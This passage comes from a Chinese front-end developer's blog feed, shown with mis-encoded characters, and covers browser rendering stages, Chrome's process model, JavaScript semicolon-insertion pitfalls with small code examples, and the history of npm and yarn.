¼åŒ–</h4><p>å½“å›¾å±‚çš„ç»˜åˆ¶åˆ—è¡¨å‡†å¤‡å¥½ä¹‹åï¼Œä¸»çº¿ç¨‹ä¼šæŠŠè¯¥ç»˜åˆ¶åˆ—è¡¨æäº¤ï¼ˆcommitï¼‰ç»™åˆæˆçº¿ç¨‹ã€‚<br>åˆæˆçº¿ç¨‹ä¼šæŒ‰ç…§è§†å£é™„è¿‘çš„å›¾å—æ¥ä¼˜å…ˆç”Ÿæˆä½å›¾ï¼Œå®é™…ç”Ÿæˆä½å›¾çš„æ“ä½œæ˜¯ç”±æ …æ ¼åŒ–æ¥æ‰§è¡Œçš„ã€‚æ‰€è°“æ …æ ¼åŒ–ï¼Œæ˜¯æŒ‡å°†å›¾å—è½¬æ¢ä¸ºä½å›¾ã€‚</p><p><img src="/2021/08/13/é‡æ’é‡æµåˆå¹¶/5.jpg" style="width: 400px"></p><p>æ …æ ¼åŒ–è¿‡ç¨‹éƒ½ä¼šä½¿ç”¨ GPU æ¥åŠ é€Ÿç”Ÿæˆ</p><h4 id="4-4-åˆæˆä¸æ˜¾ç¤º"><a href="#4-4-åˆæˆä¸æ˜¾ç¤º" class="headerlink" title="4.4 åˆæˆä¸æ˜¾ç¤º"></a>4.4 åˆæˆä¸æ˜¾ç¤º</h4><p>ä¸€æ—¦æ‰€æœ‰å›¾å—éƒ½è¢«å…‰æ …åŒ–ï¼Œåˆæˆçº¿ç¨‹å°±ä¼šç”Ÿæˆä¸€ä¸ªç»˜åˆ¶å›¾å—çš„å‘½ä»¤â€”â€”â€œDrawQuadâ€ï¼Œç„¶åå°†è¯¥å‘½ä»¤æäº¤ç»™æµè§ˆå™¨è¿›ç¨‹ã€‚æµè§ˆå™¨è¿›ç¨‹é‡Œé¢æœ‰ä¸€ä¸ªå« viz çš„ç»„ä»¶ï¼Œç”¨æ¥æ¥æ”¶åˆæˆçº¿ç¨‹å‘è¿‡æ¥çš„ DrawQuad å‘½ä»¤ï¼Œç„¶åæ ¹æ® DrawQuad å‘½ä»¤ï¼Œå°†å…¶é¡µé¢å†…å®¹ç»˜åˆ¶åˆ°å†…å­˜ä¸­ï¼Œæœ€åå†å°†å†…å­˜æ˜¾ç¤ºåœ¨å±å¹•ä¸Šã€‚</p><p><img src="/2021/08/13/é‡æ’é‡æµåˆå¹¶/6.jpg"><br><br></p><h3 id="6-é‡æ’-æ›´æ–°å…ƒç´ çš„å‡ ä½•å±æ€§"><a href="#6-é‡æ’-æ›´æ–°å…ƒç´ çš„å‡ ä½•å±æ€§" class="headerlink" title="6. é‡æ’ - æ›´æ–°å…ƒç´ çš„å‡ ä½•å±æ€§"></a>6. é‡æ’ - æ›´æ–°å…ƒç´ çš„å‡ ä½•å±æ€§</h3><p>é€šè¿‡ JavaScript æˆ–è€… CSS ä¿®æ”¹å…ƒç´ çš„å‡ ä½•ä½ç½®å±æ€§ï¼Œä¾‹å¦‚æ”¹å˜å…ƒç´ çš„å®½åº¦ã€é«˜åº¦ç­‰ï¼Œé‚£ä¹ˆæµè§ˆå™¨ä¼šè§¦å‘é‡æ–°å¸ƒå±€ï¼Œè¿™ä¸ªè¿‡ç¨‹å«<em>é‡æ’</em>ã€‚é‡æ’éœ€è¦æ›´æ–°å®Œæ•´çš„æ¸²æŸ“æµæ°´çº¿ï¼Œæ‰€ä»¥å¼€é”€ä¹Ÿæ˜¯æœ€å¤§çš„<br><img src="/2021/08/13/é‡æ’é‡æµåˆå¹¶/8.jpg"></p><p><br></p><h3 id="7-é‡ç»˜-æ›´æ–°å…ƒç´ çš„ç»˜åˆ¶å±æ€§"><a href="#7-é‡ç»˜-æ›´æ–°å…ƒç´ çš„ç»˜åˆ¶å±æ€§" class="headerlink" title="7. é‡ç»˜ - æ›´æ–°å…ƒç´ çš„ç»˜åˆ¶å±æ€§"></a>7. é‡ç»˜ - æ›´æ–°å…ƒç´ çš„ç»˜åˆ¶å±æ€§</h3><p>é‚£ä¹ˆå¸ƒå±€é˜¶æ®µå°†ä¸ä¼šè¢«æ‰§è¡Œï¼Œå› ä¸ºå¹¶æ²¡æœ‰å¼•èµ·å‡ ä½•ä½ç½®çš„å˜æ¢ï¼Œæ‰€ä»¥å°±ç›´æ¥è¿›å…¥äº†ç»˜åˆ¶é˜¶æ®µï¼Œç„¶åæ‰§è¡Œä¹‹åçš„ä¸€ç³»åˆ—å­é˜¶æ®µï¼Œè¿™ä¸ªè¿‡ç¨‹å°±å«é‡ç»˜ã€‚ç›¸è¾ƒäºé‡æ’æ“ä½œï¼Œé‡ç»˜çœå»äº†å¸ƒå±€å’Œåˆ†å±‚é˜¶æ®µï¼Œæ‰€ä»¥æ‰§è¡Œæ•ˆç‡ä¼šæ¯”é‡æ’æ“ä½œè¦é«˜ä¸€äº›ã€‚</p><p><img src="/2021/08/13/é‡æ’é‡æµåˆå¹¶/10.jpg"></p><p><br></p><h3 id="8-ç›´æ¥åˆæˆé˜¶æ®µ"><a href="#8-ç›´æ¥åˆæˆé˜¶æ®µ" class="headerlink" title="8. ç›´æ¥åˆæˆé˜¶æ®µ"></a>8. ç›´æ¥åˆæˆé˜¶æ®µ</h3><p>é‚£å¦‚æœä½ æ›´æ”¹ä¸€ä¸ªæ—¢ä¸è¦å¸ƒå±€ä¹Ÿä¸è¦ç»˜åˆ¶çš„å±æ€§ã€‚æ¸²æŸ“å¼•æ“å°†è·³è¿‡å¸ƒå±€å’Œç»˜åˆ¶ï¼Œåªæ‰§è¡Œåç»­çš„åˆæˆæ“ä½œï¼Œæˆ‘ä»¬æŠŠè¿™ä¸ªè¿‡ç¨‹å«åšåˆæˆã€‚</p><p><img src="/2021/08/13/é‡æ’é‡æµåˆå¹¶/9.jpg"></p><p>æˆ‘ä»¬ä½¿ç”¨äº† CSS çš„ transform æ¥å®ç°åŠ¨ç”»æ•ˆæœï¼Œè¿™å¯ä»¥é¿å¼€é‡æ’å’Œé‡ç»˜é˜¶æ®µï¼Œç›´æ¥åœ¨éä¸»çº¿ç¨‹ä¸Šæ‰§è¡ŒåˆæˆåŠ¨ç”»æ“ä½œã€‚è¿™æ ·çš„æ•ˆç‡æ˜¯æœ€é«˜çš„ï¼Œå› ä¸ºæ˜¯åœ¨éä¸»çº¿ç¨‹ä¸Šåˆæˆï¼Œå¹¶æ²¡æœ‰å ç”¨ä¸»çº¿ç¨‹çš„èµ„æºï¼Œå¦å¤–ä¹Ÿé¿å¼€äº†å¸ƒå±€å’Œç»˜åˆ¶ä¸¤ä¸ªå­é˜¶æ®µï¼Œæ‰€ä»¥ç›¸å¯¹äºé‡ç»˜å’Œé‡æ’ï¼Œåˆæˆèƒ½å¤§å¤§æå‡ç»˜åˆ¶æ•ˆç‡ã€‚</p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="">æå®¢æ—¶é—´-æµè§ˆå™¨å·¥ä½œåŸç†ä¸å®è·µ</a></li></ul>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>æµè§ˆå™¨å·¥ä½œåŸç†ä¸å®è·µ</title>
      <link href="/2021/08/09/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/"/>
      <url>/2021/08/09/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/</url>
      <content type="html"><![CDATA[<blockquote><ol><li>æµè§ˆå™¨æ˜¯å•è¿›ç¨‹ï¼Ÿå¤šè¿›ç¨‹ï¼Ÿå•çº¿ç¨‹ï¼Ÿå¤šçº¿ç¨‹ï¼Ÿ</li><li>ä»€ä¹ˆæ˜¯é‡æ’ï¼Œé‡ç»˜ï¼Œåˆå¹¶ï¼Ÿ</li><li>cssã€jsä¼šä¸ä¼šé˜»å¡DOMç”Ÿæˆï¼Ÿjsçš„async, defer</li><li>ä¸ºä»€ä¹ˆæ“ä½œDOMå¾ˆæ…¢ï¼Ÿè§£å†³æ–¹æ¡ˆ<code>requestAnimationFrame</code>æˆ–è™šæ‹Ÿæ»šåŠ¨</li><li>ä¸ºä»€ä¹ˆCSSåŠ¨ç”»æ¯”JSé«˜æ•ˆï¼Ÿ</li><li>ä¸ºä»€ä¹ˆä¼šç¢°åˆ°å•ä¸ªé¡µé¢å¡æ­»æœ€ç»ˆå¯¼è‡´æ‰€æœ‰é¡µé¢å´©æºƒï¼Ÿ<br>ä¸ºä»€ä¹ˆä¼šç”ŸæˆCSSOMæ ‘</li><li>ä¸Šä¸‹æ–‡æ‰§è¡Œæ ˆå’Œä½œç”¨åŸŸé“¾çš„åŒºåˆ«</li><li>é¦–æ¬¡åŠ è½½çš„ç™½å±æ—¶é—´</li></ol></blockquote><h3 id="è¿›ç¨‹-vs-çº¿ç¨‹"><a href="#è¿›ç¨‹-vs-çº¿ç¨‹" class="headerlink" title="è¿›ç¨‹ vs çº¿ç¨‹"></a>è¿›ç¨‹ vs çº¿ç¨‹</h3><p>å¤šçº¿ç¨‹å¯ä»¥å¹¶è¡Œå¤„ç†ä»»åŠ¡ï¼Œä½†æ˜¯çº¿ç¨‹æ˜¯ä¸èƒ½å•ç‹¬å­˜åœ¨çš„ï¼Œå®ƒæ˜¯ç”±è¿›ç¨‹æ¥å¯åŠ¨å’Œç®¡ç†çš„ã€‚<br>å¯åŠ¨ä¸€ä¸ªç¨‹åºçš„æ—¶å€™ï¼Œæ“ä½œç³»ç»Ÿä¼šä¸ºè¯¥ç¨‹åºåˆ›å»ºä¸€å—å†…å­˜ï¼Œç”¨æ¥å­˜æ”¾ä»£ç ã€è¿è¡Œä¸­çš„æ•°æ®å’Œä¸€ä¸ªæ‰§è¡Œä»»åŠ¡çš„ä¸»çº¿ç¨‹ï¼Œæˆ‘ä»¬æŠŠè¿™æ ·çš„ä¸€ä¸ªè¿è¡Œç¯å¢ƒå«è¿›ç¨‹ã€‚</p><p>çº¿ç¨‹ä¸è¿›ç¨‹ä¹‹é—´çš„å…³ç³»</p><ul><li>çº¿ç¨‹æ˜¯ä¾é™„äºè¿›ç¨‹çš„ï¼Œè€Œè¿›ç¨‹ä¸­ä½¿ç”¨å¤šçº¿ç¨‹å¹¶è¡Œå¤„ç†èƒ½æå‡è¿ç®—æ•ˆç‡ã€‚</li></ul><ol><li>è¿›ç¨‹ä¸­çš„ä»»æ„ä¸€çº¿ç¨‹æ‰§è¡Œå‡ºé”™ï¼Œéƒ½ä¼šå¯¼è‡´æ•´ä¸ªè¿›ç¨‹çš„å´©æºƒã€‚</li><li>çº¿ç¨‹ä¹‹é—´å…±äº«è¿›ç¨‹ä¸­çš„æ•°æ®ã€‚</li><li>å½“ä¸€ä¸ªè¿›ç¨‹å…³é—­ä¹‹åï¼Œæ“ä½œç³»ç»Ÿä¼šå›æ”¶è¿›ç¨‹æ‰€å ç”¨çš„å†…å­˜ã€‚</li><li>è¿›ç¨‹ä¹‹é—´çš„å†…å®¹ç›¸äº’éš”ç¦»ã€‚</li></ol><h3 id="1-æµè§ˆå™¨æ˜¯å•è¿›ç¨‹ï¼Ÿå¤šè¿›ç¨‹ï¼Ÿå•çº¿ç¨‹ï¼Ÿå¤šçº¿ç¨‹ï¼Ÿ"><a href="#1-æµè§ˆå™¨æ˜¯å•è¿›ç¨‹ï¼Ÿå¤šè¿›ç¨‹ï¼Ÿå•çº¿ç¨‹ï¼Ÿå¤šçº¿ç¨‹ï¼Ÿ" class="headerlink" title="1. æµè§ˆå™¨æ˜¯å•è¿›ç¨‹ï¼Ÿå¤šè¿›ç¨‹ï¼Ÿå•çº¿ç¨‹ï¼Ÿå¤šçº¿ç¨‹ï¼Ÿ"></a>1. æµè§ˆå™¨æ˜¯å•è¿›ç¨‹ï¼Ÿå¤šè¿›ç¨‹ï¼Ÿå•çº¿ç¨‹ï¼Ÿå¤šçº¿ç¨‹ï¼Ÿ</h3><p>å•è¿›ç¨‹æµè§ˆå™¨æ˜¯æŒ‡æµè§ˆå™¨çš„æ‰€æœ‰åŠŸèƒ½æ¨¡å—éƒ½æ˜¯è¿è¡Œåœ¨åŒä¸€ä¸ªè¿›ç¨‹é‡Œï¼Œè¿™äº›æ¨¡å—åŒ…å«äº†ç½‘ç»œã€æ’ä»¶ã€JavaScript è¿è¡Œç¯å¢ƒã€æ¸²æŸ“å¼•æ“å’Œé¡µé¢ç­‰ã€‚</p><p>æ‰“å¼€ä¸€ä¸ªé¡µé¢ï¼Œä¼šæœ‰4ä¸ªè¿›ç¨‹</p><ul><li>æµè§ˆå™¨è¿›ç¨‹<br>ä¸»è¦è´Ÿè´£ç•Œé¢æ˜¾ç¤ºã€ç”¨æˆ·äº¤äº’ã€å­è¿›ç¨‹ç®¡ç†ï¼ŒåŒæ—¶æä¾›å­˜å‚¨ç­‰åŠŸèƒ½ã€‚</li><li>æ¸²æŸ“è¿›ç¨‹<br>æ ¸å¿ƒä»»åŠ¡æ˜¯å°† HTMLã€CSS å’Œ JavaScript è½¬æ¢ä¸ºç”¨æˆ·å¯ä»¥ä¸ä¹‹äº¤äº’çš„ç½‘é¡µï¼Œæ’ç‰ˆå¼•æ“ Blink å’Œ JavaScript å¼•æ“ V8 éƒ½æ˜¯è¿è¡Œåœ¨è¯¥è¿›ç¨‹ä¸­ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒChrome ä¼šä¸ºæ¯ä¸ª Tab æ ‡ç­¾åˆ›å»ºä¸€ä¸ªæ¸²æŸ“è¿›ç¨‹ã€‚å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œæ¸²æŸ“è¿›ç¨‹éƒ½æ˜¯è¿è¡Œåœ¨æ²™ç®±æ¨¡å¼ä¸‹ã€‚</li><li>GPU è¿›ç¨‹<br>å…¶å®ï¼ŒChrome åˆšå¼€å§‹å‘å¸ƒçš„æ—¶å€™æ˜¯æ²¡æœ‰ GPU è¿›ç¨‹çš„ã€‚è€Œ GPU çš„ä½¿ç”¨åˆè¡·æ˜¯ä¸ºäº†å®ç° 3D CSS çš„æ•ˆæœï¼Œåªæ˜¯éšåç½‘é¡µã€Chrome çš„ UI ç•Œé¢éƒ½é€‰æ‹©é‡‡ç”¨ GPU æ¥ç»˜åˆ¶ï¼Œè¿™ä½¿å¾— GPU æˆä¸ºæµè§ˆå™¨æ™®éçš„éœ€æ±‚ã€‚æœ€åï¼ŒChrome åœ¨å…¶å¤šè¿›ç¨‹æ¶æ„ä¸Šä¹Ÿå¼•å…¥äº† GPU è¿›ç¨‹ã€‚</li><li>ç½‘ç»œè¿›ç¨‹<br>ä¸»è¦è´Ÿè´£é¡µé¢çš„ç½‘ç»œèµ„æºåŠ è½½ï¼Œä¹‹å‰æ˜¯ä½œä¸ºä¸€ä¸ªæ¨¡å—è¿è¡Œåœ¨æµè§ˆå™¨è¿›ç¨‹é‡Œé¢çš„ï¼Œç›´è‡³æœ€è¿‘æ‰ç‹¬ç«‹å‡ºæ¥ï¼Œæˆä¸ºä¸€ä¸ªå•ç‹¬çš„è¿›ç¨‹ã€‚</li><li>æ’ä»¶è¿›ç¨‹<br>ä¸»è¦æ˜¯è´Ÿè´£æ’ä»¶çš„è¿è¡Œï¼Œå› æ’ä»¶æ˜“å´©æºƒï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡æ’ä»¶è¿›ç¨‹æ¥éš”ç¦»ï¼Œä»¥ä¿è¯æ’ä»¶è¿›ç¨‹å´©æºƒä¸ä¼šå¯¹æµè§ˆå™¨å’Œé¡µé¢é€ æˆå½±å“ã€‚</li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>è¿™...è¿™åŠ ä¸ªåˆ†å·å°±ä¸æŠ¥é”™äº†ï¼Ÿ</title>
      <link href="/2021/07/28/%E5%88%86%E5%8F%B7/"/>
      <url>/2021/07/28/%E5%88%86%E5%8F%B7/</url>
      <content type="html"><![CDATA[<h3 id="1-bug"><a href="#1-bug" class="headerlink" title="1. bug"></a>1. bug</h3><p>ç¢°åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œè¿™æ®µä»£ç ä¼šæŠ¥ä¸€ä¸ª<code>num is not defined</code>çš„é”™ã€‚ä½†æ˜¯<code>num</code>å‘½åå·²ç»å®šä¹‰äº†ï¼Œåœ¨æ§åˆ¶å°ä¸€å¥ä¸€å¥æ•²æ˜¯æ²¡é—®é¢˜çš„ã€‚åæ¥å‘ç°åœ¨ç¬¬3è¡ŒåŠ ä¸ªåˆ†å·å°±å¯ä»¥äº†ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> i = <span class="number">0</span></span><br><span class="line"><span class="keyword">const</span> j = <span class="number">1</span></span><br><span class="line"><span class="keyword">const</span> nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">[nums[i], nums[j]] = [nums[j], nums[i]]</span><br><span class="line"></span><br><span class="line"><span class="comment">/* æŠ¥é”™ä¿¡æ¯</span></span><br><span class="line"><span class="comment">Uncaught ReferenceError: nums is not defined</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-ä¸å†™åˆ†å·éœ€è¦æ³¨æ„çš„æƒ…å†µ"><a href="#2-ä¸å†™åˆ†å·éœ€è¦æ³¨æ„çš„æƒ…å†µ" class="headerlink" title="2. ä¸å†™åˆ†å·éœ€è¦æ³¨æ„çš„æƒ…å†µ"></a>2. ä¸å†™åˆ†å·éœ€è¦æ³¨æ„çš„æƒ…å†µ</h3><p>ç”±äºæˆ‘ä»¬çš„ä»£ç è§„èŒƒæ˜¯ä¸åŠ åˆ†å·çš„ï¼Œæ€»ç»“ä¸€ä¸‹ä¸åŠ åˆ†å·éœ€è¦æ³¨æ„çš„æƒ…å†µã€‚</p><h4 id="2-1-ä»¥æ‹¬å·å¼€å¤´çš„è¯­å¥"><a href="#2-1-ä»¥æ‹¬å·å¼€å¤´çš„è¯­å¥" class="headerlink" title="2.1 ä»¥æ‹¬å·å¼€å¤´çš„è¯­å¥"></a>2.1 ä»¥æ‹¬å·å¼€å¤´çš„è¯­å¥</h4><p>è¿™é‡Œçœ‹ä¼¼æ˜¯ä¸¤ä¸ªç‹¬ç«‹æ‰§è¡Œçš„å‡½æ•°è¡¨è¾¾å¼ï¼Œå…¶å®ç¬¬ä¸‰ç»„æ‹¬å·è¢«ç†è§£ä¸ºä¼ å‚ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a);</span><br><span class="line">&#125;)()<span class="comment">/*è¿™é‡Œæ²¡æœ‰è¢«è‡ªåŠ¨æ’å…¥åˆ†å·*/</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a);</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line"><span class="comment">/* æŠ¥é”™ä¿¡æ¯</span></span><br><span class="line"><span class="comment">(intermediate value)(...) is not a function</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><h4 id="2-2-ä»¥æ•°ç»„å¼€å¤´çš„è¯­å¥"><a href="#2-2-ä»¥æ•°ç»„å¼€å¤´çš„è¯­å¥" class="headerlink" title="2.2 ä»¥æ•°ç»„å¼€å¤´çš„è¯­å¥"></a>2.2 ä»¥æ•°ç»„å¼€å¤´çš„è¯­å¥</h4><p>è¢«ç†è§£ä¸ºä¸‹æ ‡è¿ç®—ç¬¦å’Œé€—å·è¡¨è¾¾å¼<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [[]]<span class="comment">/*è¿™é‡Œæ²¡æœ‰è¢«è‡ªåŠ¨æ’å…¥åˆ†å·*/</span></span><br><span class="line">[<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>].forEach(<span class="function"><span class="params">e</span> =&gt;</span> <span class="built_in">console</span>.log(e))</span><br></pre></td></tr></table></figure></p><h4 id="2-3-ä»¥æ­£åˆ™è¡¨è¾¾å¼å¼€å¤´çš„è¯­å¥"><a href="#2-3-ä»¥æ­£åˆ™è¡¨è¾¾å¼å¼€å¤´çš„è¯­å¥" class="headerlink" title="2.3 ä»¥æ­£åˆ™è¡¨è¾¾å¼å¼€å¤´çš„è¯­å¥"></a>2.3 ä»¥æ­£åˆ™è¡¨è¾¾å¼å¼€å¤´çš„è¯­å¥</h4><p>æ­£åˆ™çš„ç¬¬ä¸€ä¸ªæ–œæ è¢«ç†è§£ä¸ºé™¤å·ï¼Œåé¢çš„æ„æ€å°±å˜äº†<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>, g = &#123;<span class="attr">test</span>:<span class="function"><span class="params">()</span>=&gt;</span><span class="number">0</span>&#125;, b = <span class="number">1</span><span class="comment">/*è¿™é‡Œæ²¡æœ‰è¢«è‡ªåŠ¨æ’å…¥åˆ†å·*/</span></span><br><span class="line">/(a)/g.test(<span class="string">"abc"</span>)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">RegExp</span>.$<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p><h4 id="2-4-ä»¥Templateå¼€å¤´çš„è¯­å¥"><a href="#2-4-ä»¥Templateå¼€å¤´çš„è¯­å¥" class="headerlink" title="2.4 ä»¥Templateå¼€å¤´çš„è¯­å¥"></a>2.4 ä»¥Templateå¼€å¤´çš„è¯­å¥</h4><p>å› ä¸ºæ²¡æœ‰è‡ªåŠ¨æ’å…¥åˆ†å·ï¼Œå‡½æ•° f è¢«è®¤ä¸ºè·Ÿ Template ä¸€ä½“çš„ï¼Œè¿›è€Œè¢«è«åå…¶å¦™åœ°æ‰§è¡Œäº†ä¸€æ¬¡ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> g = f<span class="comment">/*è¿™é‡Œæ²¡æœ‰è¢«è‡ªåŠ¨æ’å…¥åˆ†å·*/</span></span><br><span class="line"><span class="string">`Template`</span>.match(<span class="regexp">/(a)/</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">RegExp</span>.$<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://time.geekbang.org/column/article/87179" target="_blank" rel="noopener">JavaScriptè¯­æ³•ï¼ˆé¢„å¤‡ç¯‡ï¼‰ï¼šåˆ°åº•è¦ä¸è¦å†™åˆ†å·å‘¢ï¼Ÿ</a></li></ul>]]></content>
      
      <categories>
          
          <category> Bug </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>npmåŒ…å‘å±•å²</title>
      <link href="/2021/07/15/npm%E5%8C%85%E5%8F%91%E5%B1%95%E5%8F%B2/"/>
      <url>/2021/07/15/npm%E5%8C%85%E5%8F%91%E5%B1%95%E5%8F%B2/</url>
      <content type="html"><![CDATA[<blockquote><p>JSåŸæ¥åªè¿è¡Œåœ¨æµè§ˆå™¨ä¸­ã€‚Node.jså’Œnpmçš„è¯ç”Ÿï¼Œè®©jså¯ä»¥æ“ä½œæ–‡ä»¶ï¼Œç½‘ç»œä¼ è¾“ï¼Œä½¿å¾—å‰ç«¯æ‹¥æœ‰äº†å·¥ç¨‹åŒ–çš„å¯èƒ½ï¼Œå¤§å¤§å‡å°‘äº†é‡å¤æ€§å·¥ä½œï¼ˆåŒ…èµ„æºç®¡ç†ã€çƒ­æ›´æ–°æœºåˆ¶ã€webpackæ‰“åŒ…ï¼‰ã€‚</p></blockquote><p><br></p><h3 id="1-åœ¨æ²¡æœ‰åŒ…ç®¡ç†å™¨å‰"><a href="#1-åœ¨æ²¡æœ‰åŒ…ç®¡ç†å™¨å‰" class="headerlink" title="1. åœ¨æ²¡æœ‰åŒ…ç®¡ç†å™¨å‰"></a>1. åœ¨æ²¡æœ‰åŒ…ç®¡ç†å™¨å‰</h3><p>æ­£ç¡®æ¥è¯´ Node.js æ˜¯ä¸å­˜åœ¨æ²¡æœ‰åŒ…ç®¡ç†å™¨çš„æ—¶æœŸçš„ã€‚2009 å¹´ Node.js é—®ä¸–çš„æ—¶å€™ NPM çš„é›å½¢ä¹Ÿå‘å¸ƒäº†ã€‚<br>è€Œåœ¨2009å¹´ä¹‹å‰ï¼Œé‚£æ—¶å€™åšå¾—æœ€å¤šçš„äº‹æƒ…æ˜¯ï¼šåœ¨ç½‘ä¸Šæ‰¾åŒ…ï¼Œå¦‚ jQueryã€‚æ‰¾åˆ°ä¸‹è½½åœ°å€ï¼Œä¸‹è½½ æ”¾åˆ°é¡¹ç›®ä¸­ä¸€ä¸ªå« libs çš„ç›®å½•ï¼Œæˆ–è€…ç›´æ¥å°† CDN é“¾æ¥ç²˜è´´åˆ° HTML ä¸­ã€‚</p><p><br></p><h3 id="2-npm-v1-v2"><a href="#2-npm-v1-v2" class="headerlink" title="2. npm v1-v2"></a>2. npm v1-v2</h3><p>2009 å¹´ï¼ŒNode.js è¯ç”Ÿï¼Œnpmï¼ˆNode.js Package Managerï¼‰çš„é›å½¢ä¹Ÿæ­£åœ¨é…é…¿ã€‚<br>â€‹2011 å¹´ï¼Œnpm å‘å¸ƒäº† 1.0 ç‰ˆæœ¬ã€‚<br>è¿™ä¸€ç‰ˆnpmå¸¦æ¥çš„node_modulesæ–‡ä»¶ç»“æ„ï¼Œæ˜¯åµŒå¥—ç»“æ„ã€‚<br>æ­¤æ—¶ï¼Œnode_modulesçš„åµŒå¥—æ·±åº¦ååˆ†å¯æ€•ï¼Œå ªæ¯”é»‘æ´ã€‚åªæœ‰å½“æ‰€æœ‰å­å¶éƒ½ä¸å†ä¾èµ–ç¬¬ä¸‰æ–¹åŒ…æ—¶ï¼Œè¿™æ£µæ ‘æ‰èƒ½èµ°åˆ°å°½å¤´ã€‚<br>ä¸€ä¸ªåº“ï¼Œè¢«ä¸åŒçš„åŒ…ä¾èµ–äº†ï¼Œé‚£ä¹ˆå®ƒå°±ä¼šè¢«å®‰è£…ä¸¤æ¬¡ï¼Œè¿™ç§åµŒå¥—ç»“æ„å¾ˆå¿«å°±èƒ½æŠŠç£ç›˜å æ»¡ã€‚ç›¸ä¿¡æ—©æœŸnpmçš„windowsç”¨æˆ·éƒ½è§è¿‡è¿™ä¸ªå¼¹çª—ï¼š</p><p>ï¼ˆnode_modulesæ–‡ä»¶å¤¹æ— æ³•åˆ é™¤ï¼Œå› ä¸ºè¶…è¿‡äº†windowsèƒ½å¤„ç†çš„æœ€å¤§è·¯å¾„ï¼‰</p><p><br></p><h3 id="3-yarn-amp-npm-v3"><a href="#3-yarn-amp-npm-v3" class="headerlink" title="3. yarn &amp; npm v3"></a>3. yarn &amp; npm v3</h3><p>2016å¹´ï¼Œyarnè¯ç”Ÿäº†ã€‚yarnè§£å†³äº†npmå‡ ä¸ªæœ€ä¸ºè¿«åœ¨çœ‰ç«çš„é—®é¢˜ï¼š</p><ul><li>å®‰è£…å¤ªæ…¢ -&gt; åŠ ç¼“å­˜ï¼Œå¤šçº¿ç¨‹</li><li>åµŒå¥—ç»“æ„ -&gt; æ‰å¹³åŒ–</li><li>æ— ä¾èµ–é” -&gt; yarn.lock</li></ul><p>yarnæœ€å¤§çš„è´¡çŒ®æ˜¯å‘æ˜äº†<em>yarn.lockä¾èµ–é”</em>ã€‚è¿™ä¸€æ‰å¹³åŒ–ç»“æ„ï¼Œä½¿å¾—å®é™…éœ€è¦å®‰è£…çš„åŒ…æ•°é‡å¤§å¤§å‡å°‘ï¼Œå†åŠ ä¸Šé¦–å‘çš„ç¼“å­˜æœºåˆ¶ï¼Œä½¿å¾—ä¾èµ–å®‰è£…çš„é€Ÿåº¦å¤§å¹…æå‡ã€‚è€Œnpmåœ¨ä¸€å¹´åçš„v5æ‰è·Ÿä¸Šäº†æ­¥ä¼ï¼Œå‘å¸ƒäº†package-lock.jsonã€‚åœ¨æ²¡æœ‰ä¾èµ–é”çš„å¹´ä»£ï¼Œå³ä½¿æ²¡æœ‰æ”¹å˜ä¸€è¡Œä»£ç ï¼Œä¸€æ¬¡<code>npm install</code>å¸¦æ¥çš„å®é™…ä»£ç 